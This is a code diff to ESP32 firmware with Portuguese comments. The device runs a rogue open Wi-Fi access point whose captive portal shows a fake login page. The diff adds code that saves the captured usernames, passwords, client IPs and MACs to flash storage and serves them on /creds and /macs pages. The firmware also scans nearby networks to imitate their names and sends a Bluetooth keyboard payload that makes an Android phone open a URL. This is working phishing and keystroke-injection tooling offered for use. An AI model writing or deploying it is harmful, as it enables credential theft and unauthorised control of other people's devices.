@@ -6,6 +6,8 @@
 #include <Adafruit_GFX.h>
 #include <Adafruit_SSD1306.h>
 #include <BleKeyboard.h>
+#include <FS.h>
+#include <SPIFFS.h>
 
 #define SCREEN_WIDTH 128
 #define SCREEN_HEIGHT 64
@@ -14,7 +16,6 @@ Adafruit_SSD1306 display(SCREEN_WIDTH, SCREEN_HEIGHT, &Wire, OLED_RESET);
 
 #define BTN_MODE 18
 #define BTN_ACTION 19
-
 #define KEY_SEARCH 0x44
 
 AsyncWebServer server(80);
@@ -55,6 +56,15 @@ h2{color:#003366}input,button{width:100%;padding:10px;margin:10px 0}button{backg
 </form><div class="note">Ao iniciar sessão, aceita os Termos e Condições.</div></div></body></html>
 )rawliteral";
 
+// ---------------- UTILITÁRIOS SPIFFS ----------------
+void appendToFile(const char* path, const String& data) {
+  File file = SPIFFS.open(path, FILE_APPEND);
+  if (!file) return;
+  file.println(data);
+  file.close();
+}
+
+// ---------------- INTERFACE E DISPLAY ----------------
 void showMascot(bool blink) {
   display.setTextSize(1);
   display.setCursor(0, 0);
@@ -99,6 +109,53 @@ void resetSystem() {
   visitCount = 0;
 }
 
+void scanNetworks() {
+  numTargets = WiFi.scanNetworks();
+  for (int i = 0; i < numTargets && i < 10; i++) {
+    targetSSIDs[i] = WiFi.SSID(i);
+  }
+  if (numTargets == 0) {
+    targetSSIDs[0] = "NoNetworks";
+    numTargets = 1;
+  }
+}
+
+// ---------------- SPIFFS PAGE ROUTES ----------------
+void setupWebPages() {
+  server.on("/creds", HTTP_GET, [](AsyncWebServerRequest *request){
+    File file = SPIFFS.open("/creds.txt", FILE_READ);
+    if (!file) {
+      request->send(200, "text/plain", "Nenhum dado disponível.");
+      return;
+    }
+
+    String content = "<!DOCTYPE html><html><body><h2>Credenciais</h2><ul>";
+    while (file.available()) {
+      content += "<li>" + file.readStringUntil('\n') + "</li>";
+    }
+    content += "</ul></body></html>";
+    file.close();
+    request->send(200, "text/html", content);
+  });
+
+  server.on("/macs", HTTP_GET, [](AsyncWebServerRequest *request){
+    File file = SPIFFS.open("/macs.txt", FILE_READ);
+    if (!file) {
+      request->send(200, "text/plain", "Nenhum MAC disponível.");
+      return;
+    }
+
+    String content = "<!DOCTYPE html><html><body><h2>MACs Registrados</h2><ul>";
+    while (file.available()) {
+      content += "<li>" + file.readStringUntil('\n') + "</li>";
+    }
+    content += "</ul></body></html>";
+    file.close();
+    request->send(200, "text/html", content);
+  });
+}
+
+// ---------------- CAPTIVE PORTAL ----------------
 void setupCaptive(const char* ssid) {
   WiFi.softAPConfig(apIP, apIP, netMsk);
   WiFi.softAP(ssid, "", 6);
@@ -113,8 +170,15 @@ void setupCaptive(const char* ssid) {
 
   server.on("/login", HTTP_POST, [](AsyncWebServerRequest *r) {
     String u = r->arg("user"), p = r->arg("pass");
+    String clientIP = r->client()->remoteIP().toString();
+    String macStr = WiFi.softAPmacAddress();
+    String entry = "U:" + u + " P:" + p + " IP:" + clientIP + " MAC:" + macStr;
+
     if (credsCount < 10)
-      capturedCreds[credsCount++] = "U:" + u + " P:" + p;
+      capturedCreds[credsCount++] = entry;
+
+    appendToFile("/creds.txt", entry);
+    appendToFile("/macs.txt", macStr);
     r->redirect("/");
   });
 
@@ -122,31 +186,19 @@ void setupCaptive(const char* ssid) {
     r->redirect("/");
   });
 
+  setupWebPages();
   server.begin();
 }
 
-void scanNetworks() {
-  numTargets = WiFi.scanNetworks();
-  for (int i = 0; i < numTargets && i < 10; i++) {
-    targetSSIDs[i] = WiFi.SSID(i);
-  }
-  if (numTargets == 0) {
-    targetSSIDs[0] = "NoNetworks";
-    numTargets = 1;
-  }
-}
-
-// --------- Bluetooth: Ativar e Desativar ---------
+// ---------------- BLE / HID ----------------
 void startBLE() {
   bleKeyboard.begin();
 }
 
 void stopBLE() {
-  // BLE não tem .end() direto, então só desliga o WiFi para evitar conflito
   WiFi.mode(WIFI_OFF);
 }
 
-// --------- PAYLOAD HID PARA ANDROID ---------
 void startHIDPayload() {
   WiFi.mode(WIFI_OFF);
   delay(500);
@@ -156,29 +208,27 @@ void startHIDPayload() {
     return;
   }
 
-  Serial.println("Enviando payload: abrir navegador e acessar link...");
   delay(2000);
-
-  // Comando para abrir navegador padrão no Android
   bleKeyboard.write(KEY_MEDIA_WWW_HOME);
-  delay(1500); // aguarda o browser abrir
-
-  // Digitar a URL lentamente
+  delay(1500);
   String url = "https://github.com/pedrolucas7i";
   for (char c : url) {
     bleKeyboard.print(c);
     delay(50);
   }
-
-  // Pressionar ENTER para navegar
   bleKeyboard.write(KEY_RETURN);
-  Serial.println("Payload enviado com sucesso.");
 }
 
+// ---------------- SETUP / LOOP ----------------
 void setup() {
   Serial.begin(115200);
   pinMode(BTN_MODE, INPUT_PULLDOWN);
   pinMode(BTN_ACTION, INPUT_PULLDOWN);
+
+  if (!SPIFFS.begin(true)) {
+    Serial.println("Erro ao montar SPIFFS!");
+    while (true);
+  }
 
   if (!display.begin(SSD1306_SWITCHCAPVCC, 0x3C)) {
     Serial.println("Falha ao iniciar display!");
